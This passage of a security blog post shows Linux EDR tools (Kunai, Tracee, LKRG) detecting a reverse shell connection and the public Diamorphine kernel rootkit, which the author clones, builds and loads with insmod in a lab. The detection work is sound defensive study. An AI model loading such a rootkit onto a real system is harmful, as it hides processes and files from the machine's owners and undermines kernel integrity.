+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd|/usr/lib/systemd/systemd|/usr/bin/python3.12|/usr/bin/bash&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;command_line&#34;</span>: <span style="color:#e6db74">&#34;/bin/bash&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;exe&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#e6db74">&#34;/usr/bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;socket&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;domain&#34;</span>: <span style="color:#e6db74">&#34;AF_INET&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;SOCK_STREAM&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;proto&#34;</span>: <span style="color:#e6db74">&#34;TCP&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;src&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;ip&#34;</span>: <span style="color:#e6db74">&#34;172.16.205.15&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">50132</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;dst&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;hostname&#34;</span>: <span style="color:#e6db74">&#34;?&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;ip&#34;</span>: <span style="color:#e6db74">&#34;172.16.205.1&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;port&#34;</span>: <span style="color:#ae81ff">4242</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;public&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;is_v6&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;community_id&#34;</span>: <span style="color:#e6db74">&#34;1:SU314PGEhh7ex8ppaUaGGB6uXxw=&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;connected&#34;</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;info&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;event&#34;</span>: {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;source&#34;</span>: <span style="color:#e6db74">&#34;kunai&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">60</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;connect&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;uuid&#34;</span>: <span style="color:#e6db74">&#34;0f47910f-29e7-662e-24bf-c50208439702&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;batch&#34;</span>: <span style="color:#ae81ff">280</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;utc_time&#34;</span>: <span style="color:#e6db74">&#34;2026-01-18T03:22:49.150574287Z&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Reverse Shell Example Output<br><br></span>
+<h2 id="3-tracee">3. Tracee</h2>
+<p><em>Tracee</em> is a Linux runtime security tool that uses eBPF to capture syscalls and process behavior in real time. Unlike <em>Kunai’s</em> enriched EDR approach, <em>Tracee</em> gives raw and low-level events, perfect for forensics, adversary simulations, and understanding exactly how attacks unfold.</p>
+<h3 id="31-installation">3.1 Installation</h3>
+<p>Again, these installation instructions are meant for Ubuntu/Debian machines.</p>
+<p><u>Step 1: Installing dependencies</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt-get install golang-go build-essential linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span> clang libelf1 libelf-dev zlib1g-dev libbpf-dev
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Tracee</em> Dependencies<br><br></span>
+<p><u>Step 2: Build <em>Tracee</em> from Source</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/aquasecurity/tracee.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd tracee
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/tracee$ make
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Building <em>Tracee</em><br><br></span>
+<p><u>Step 3: Install <em>Tracee</em></u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/tracee$ sudo cp ./dist/tracee /usr/bin/
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>Tracee</em><br><br></span>
+<h3 id="32-capabilities-overview">3.2 Capabilities Overview</h3>
+<p>The list of monitored events is extensive, so I’ll point you to the command that lets you inspect <em>Tracee’s</em> capabilities yourself.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ tracee list events
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Showing Supported <em>Tracee</em> Events<br><br></span>
+<h3 id="33-testing-capabilities">3.3 Testing Capabilities</h3>
+<p>To test out the true capabilities of <em>Tracee</em>, we assume that our machine has already been compromised. Using <a href="https://github.com/m0nad/Diamorphine.git"><em>Diamorphine</em></a> as our example LKM rootkit, we shall first insert the module, before running <em>Tracee</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/m0nad/Diamorphine.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd Diamorphine
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ make
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod diamorphine.ko
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Inserting <em>Diamorphine</em> LKM Rootkit<br><br></span>
+<h4 id="331-hidden-kernel-module">3.3.1 Hidden Kernel Module</h4>
+<p>This command in the listing below instructs <em>Tracee</em> to subscribe specifically to the <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;hidden_kernel_module&ensp;</span> event, which detects kernel modules that are present in memory but intentionally omitted from standard kernel data structures such as /proc/modules. This is a common stealth technique used by Linux kernel rootkits to evade user-space inspection tools.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo tracee -e hidden_kernel_module
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Tracee</em> - Filter For<span style="font-family: Courier, monospace; font-weight: 600;"> hidden_kernel_module </span>Events<br><br></span>
+<p>The output shows <em>Tracee</em> successfully identifying a kernel module that is not visible through normal enumeration methods. In this case, the hidden module is <em>Diamorphine</em>, along with its kernel memory address and source version hash, providing strong attribution that a stealthy LKM is active on the system.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">TIME</span>             <span style="color:#a6e22e">UID</span>    <span style="color:#a6e22e">COMM</span>             <span style="color:#a6e22e">PID</span>     <span style="color:#a6e22e">TID</span>     <span style="color:#a6e22e">EVENT</span>                     <span style="color:#a6e22e">ARGS</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">28</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#ae81ff">516401</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">hidden_kernel_module</span>      <span style="color:#a6e22e">address</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0xffffffffc0ad1140</span>, <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">diamorphine</span>, <span style="color:#a6e22e">srcversion</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">39</span><span style="color:#a6e22e">C9AFE44143084E37251EA</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Detecting Hidden <em>Diamorphine</em> LKM<br><br></span>
+<h4 id="332-syscall-hooking">3.3.2 Syscall Hooking</h4>
+<p>This command enables <em>Tracee’s</em> <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;syscall_hooking&ensp;</span> detection, which monitors the system call table for unauthorized modifications. Kernel rootkits frequently hook syscalls to hide processes, files, or escalate privileges—making syscall integrity a high-value detection signal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo tracee -e syscall_hooking
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>Tracee</em> - Filter For<span style="font-family: Courier, monospace; font-weight: 600;"> syscall_hooking </span>Events<br><br></span>
+<p>Tracee reports three syscall hooking events, corresponding to the syscalls modified by <em>Diamorphine</em>: <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;kill(),&ensp;</span><span style="font-family: Courier, monospace; font-weight: 600;">&ensp;getdents()&ensp;</span>and<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;getdents64()&ensp;</span>. These hooks are used to hide processes, conceal files and directories, and provide a covert control channel via signals.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">TIME</span>             <span style="color:#a6e22e">UID</span>    <span style="color:#a6e22e">COMM</span>             <span style="color:#a6e22e">PID</span>     <span style="color:#a6e22e">TID</span>     <span style="color:#a6e22e">EVENT</span>                     <span style="color:#a6e22e">ARGS</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Detecting Syscall Hooking<br><br></span>
+<h2 id="4-lkrg">4. LKRG</h2>
+<p>LKRG performs runtime integrity checking of the Linux kernel and detection of
+security vulnerability exploits against the kernel.</p>
+<p>LKRG is a kernel module (not a kernel patch), so it can be built for and loaded
+on top of a wide range of mainline and distros&rsquo; kernels, without needing to
+patch those.  We currently support kernel versions ranging from as far back as
+RHEL7&rsquo;s (and its many clones/revisions) to latest mainline and distros kernels.</p>
+<p>LKRG 1.0.0 has been tested with Linux kernels from RHEL/CentOS 7&rsquo;s <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;3.10.0-1160&ensp;</span> and up to Fedora&rsquo;s build of <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;6.17.0-0.rc4.36.fc44.x86_64&ensp;</span>.</p>
+<p>LKRG currently supports the x86-64, 32-bit x86, AArch64 (ARM64), and 32-bit ARM
+CPU architectures.</p>
+<h3 id="41-installation">4.1 Installation</h3>
+<p><u>Step 1: Installing dependencies</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt-get install make gcc gawk libelf-dev linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>LKRG</em> Dependencies<br><br></span>
+<p><u>Step 2: Build From Source</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/lkrg-org/lkrg.git
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd lkrg
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ make -j8
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Building <em>LKRG</em> from Source<br><br></span>
+<p><u>Step 3: Testing LKM</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Insert LKM</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod lkrg.ko kint_enforce<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inspect the kernel logs</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo dmesg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove LKM</span>
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo rmmod lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Testing <em>LKRG</em><br><br></span>
+<p><u>Step 4: Install <em>LKRG</em> to Start On Boot</u></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ make install
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ sudo systemctl enable lkrg
+</span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ sudo systemctl start lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Installing <em>LKRG</em><br><br></span>
+<h3 id="42-capabilities-overview">4.2 Capabilities Overview</h3>
+<p>According to the <a href="https://lkrg.org/">official site</a>:</p>
+<blockquote>
+<p><em>&ldquo;LKRG attempts to post-detect and hopefully promptly respond to unauthorized modifications to the running Linux kernel (integrity checking) or to credentials such as user IDs of the running processes (exploit detection). For process credentials, LKRG attempts to detect the exploit and take action before the kernel would grant access (such as open a file) based on the unauthorized credentials.&rdquo;</em></p>
+</blockquote>
+<h3 id="43-testing-capabilities">4.3 Testing Capabilities</h3>
+<p>To validate <em>LKRG’s</em> post-detection claims, we first disable the <em>LKRG</em> kernel module to simulate an unprotected system state before introducing a stealthy kernel rootkit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo systemctl stop lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Stop <em>LKRG</em> Service<br><br></span>
+<p>With <em>LKRG</em> inactive, we load the <em>Diamorphine</em> LKM, which employs multiple stealth techniques to hide its presence from standard kernel visibility mechanisms.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod ~/Diamorphine/diamorphine.ko
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Load <em>Diamorphine</em> Rootkit<br><br></span>
+<p>Once the malicious module is resident in memory, <em>LKRG</em> is re-enabled to assess whether it can retrospectively detect kernel integrity violations introduced while it was offline.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo systemctl start lkrg
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Start <em>LKRG</em> Service<br><br></span>
+<p>Finally, we monitor the kernel ring buffer in real time to observe <em>LKRG’s</em> detection output and alerting behavior.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo dmesg -w
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  126.839032<span style="color:#f92672">]</span> LKRG: ALERT: DETECT: Kernel: Found <span style="color:#ae81ff">1</span> fewer modules in module list <span style="color:#f92672">(</span>71<span style="color:#f92672">)</span> than in KOBJ <span style="color:#f92672">(</span>72<span style="color:#f92672">)</span>, maybe hidden module name diamorphine
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  126.839046<span style="color:#f92672">]</span> LKRG: ALERT: DETECT: Kernel: <span style="color:#ae81ff">1</span> checksums changed unexpectedly
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Detecting <em>Diamorphine</em> Rootkit<br><br></span>
+<h2 id="5-conclusion">5. Conclusion</h2>
+<p>From a threat hunter’s perspective, Linux EDR provides the kernel-level visibility needed to reconstruct attacker behavior through process, syscall, and network context. For red teamers, tools like <em>Kunai</em> and <em>Tracee</em> clearly define what tradecraft is observable and where stealth breaks down.</p>
+<p><em>Tracee</em> and <em>LKRG</em> demonstrate that even kernel rootkits and syscall tampering leave detectable integrity and behavioral signals.</p>
+<p>Ultimately, modern Linux security is no longer about hiding single actions, but about surviving continuous, low-level scrutiny.</p>
+<p>I hope you learned something meaningful today, and I hope to see you in the next one. Take care!</p>
+<h2 id="6-references">6. References</h2>
+<ol>
+<li>LKRG Project: <a href="https://lkrg.org/">https://lkrg.org/</a></li>
+<li>LKRG GitHub Repository: <a href="https://github.com/lkrg-org/lkrg">https://github.com/lkrg-org/lkrg</a></li>
+<li>Kunai Project: <a href="https://github.com/kunai-project/kunai">https://github.com/kunai-project/kunai</a></li>
+<li>Tracee Project: <a href="https://github.com/aquasecurity/tracee">https://github.com/aquasecurity/tracee</a></li>
+<li>Diamorphine LKM Rootkit: <a href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a></li>
+<li>Linux eBPF Documentation: <a href="https://www.kernel.org/doc/html/latest/bpf/">https://www.kernel.org/doc/html/latest/bpf/</a></li>
+<li>Aqua Security: Tracee Overview: <a href="https://aquasecurity.github.io/tracee/">https://aquasecurity.github.io/tracee/</a></li>
+</ol>
+
+        
+      </div>
+    </article>
+
+    <div class="post-info">
+      
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+
+            
+            <span class="button previous">
+                <a href="https://mathscantor.github.io/posts/zabbix-cve-2024-36467-and-cve-2024-42327-analysis/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Zabbix CVE-2024-36467 &amp; CVE-2024-42327 Analysis</span>
+                </a>
+            </span>
+            
+
+            
+
+        </div>
+    </div>
+
+    </div>
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Linux%20EDR%20for%20Host%20Events&amp;caption=Linux%20EDR%20for%20Host%20Events&amp;canonicalUrl=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Linux%20EDR%20for%20Host%20Events&amp;body=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f&amp;media=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f;description=Linux%20EDR%20for%20Host%20Events" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f&amp;title=Linux%20EDR%20for%20Host%20Events&amp;summary=Linux%20EDR%20for%20Host%20Events&amp;source=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmathscantor.github.io%2fposts%2flinux-edr-for-host-events%2f&amp;resubmit=true&amp;title=Linux%20EDR%20for%20Host%20Events" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
